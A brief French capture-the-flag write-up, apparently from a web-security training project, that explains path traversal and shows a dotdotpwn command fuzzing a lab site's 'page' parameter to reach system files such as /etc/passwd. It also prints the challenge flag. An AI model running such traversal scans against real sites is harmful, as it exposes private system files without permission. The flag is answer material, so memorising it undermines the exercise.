# PATH_TRAVERSAL

## Flag
```
b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

## Découverte

Une des failles connues décrites dans la documentation d'owasp s'appelle le \
path traversal ou le directory traversal. Elle consiste a chercher des fichiers \
et des dossiers stockés en dehors de la racine web.
Pour vérifier les milliers de possibilité j'utilise un script perl que vous \
retrouverez plus bas dans la documentation.
Les fichiers du site ont l'air d'être chargés via l'url :
```
http://10.11.200.198/?page={FILENAME}
```
On va donc faire tourner le script a partir de cette URL.
```
./dotdotpwn.pl -m http-url -u "http://{IP_ADDRESS}/?page=TRAVERSAL" -k "root:"  -d 8 -t 200 -s
```

## Documentation
- [owasp - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [dotdotpwn - script perl](https://github.com/wireghoul/dotdotpwn)

---

[RETURN](https://github.com/jlange91/darkly)
